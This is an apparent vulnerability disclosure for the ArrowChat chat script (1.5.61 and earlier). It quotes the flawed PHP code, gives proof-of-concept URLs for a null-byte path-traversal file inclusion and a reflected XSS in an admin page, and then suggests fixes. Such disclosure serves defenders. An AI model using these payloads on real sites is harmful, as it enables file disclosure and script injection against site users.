@@ -1,0 +1,98 @@
+# Exploit Title: ArrowChat <=~ 1.5.61  Multiple vulnerabilities
+# Date: 01/01/2013
+# Exploit Author: Kallimero
+# Version: 1.5.61, before, and maybe 1.6
+# Tested on: Debian
+
+
+Introduction
+============
+
+ArrowChat is a chat script, which is able to be integrate in various CMS,
+as wordpress, or some bulletin boards.
+
+
+Vulnz
+========
+
+
+1- ) Local File Inclusion
+
+
+external.php let us load langage, but not a secure way.
+
+---------------[external.php]---------------
+
+// Load another language if lang GET value is set and exists
+if (var_check('lang'))
+{
+    $lang = get_var('lang');
+
+    if (file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR .
+AC_FOLDER_LANGUAGE . DIRECTORY_SEPARATOR . $lang . DIRECTORY_SEPARATOR .
+$lang . ".php"))
+    {
+        include (dirname(__FILE__) . DIRECTORY_SEPARATOR .
+AC_FOLDER_LANGUAGE . DIRECTORY_SEPARATOR . $lang . DIRECTORY_SEPARATOR .
+$lang . ".php");
+    }
+}
+---------------[index.php]---------------
+
+Thanks to the nullbyte tricks we'll be able to include any php file, like
+that :
+
+http://[site]/[path]/external.php?lang=../path/to/file%00&type=djs
+
+2- ) reflected XSS
+
+The administration layout is accessible for anyone. Even if we can't exec
+the php code of the admin, we can inject html thanks to $_SERVER['PHP_SELF']
+
+
+Example :
+-------[admin/layout/pages_general.php]-----
+
+<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>?do=<?php
+echo $do; ?>" enctype="multipart/form-data">
+----------------------------------
+
+PoC:
+http://
+[site]/[path]/admin/layout/pages_general.php/'"/><script>alert(1);</script>
+
+
+How to Fix ?
+============
+
+ To fix the LFI, you can replace it with :
+ // Load another language if lang GET value is set and exists
+
+if (var_check('lang'))
+{
+    $lang = get_var('lang');
+    if(preg_match("#^[a-z]{2,5}$#i", $lang)){
+        if (file_exists(dirname(__FILE__) . DIRECTORY_SEPARATOR .
+AC_FOLDER_LANGUAGE . DIRECTORY_SEPARATOR . $lang . DIRECTORY_SEPARATOR .
+$lang . ".php"))
+        {
+            include (dirname(__FILE__) . DIRECTORY_SEPARATOR .
+AC_FOLDER_LANGUAGE . DIRECTORY_SEPARATOR . $lang . DIRECTORY_SEPARATOR .
+$lang . ".php");
+        }
+    }
+}
+
+lang will be include only if it's a valid lang file.
+
+For the XSS's, you can use a .htaccess to protect the layout directory, and
+use htmlentities to avoid the html inj'.
+
+
+
+Thanks
+=========
+
+All hwc members : Necromoine, fr0g, AppleSt0rm, St0rn, Zhyar, k3nz0,
+gr4ph0s.
+Please visit : http://www.orgasm.re/
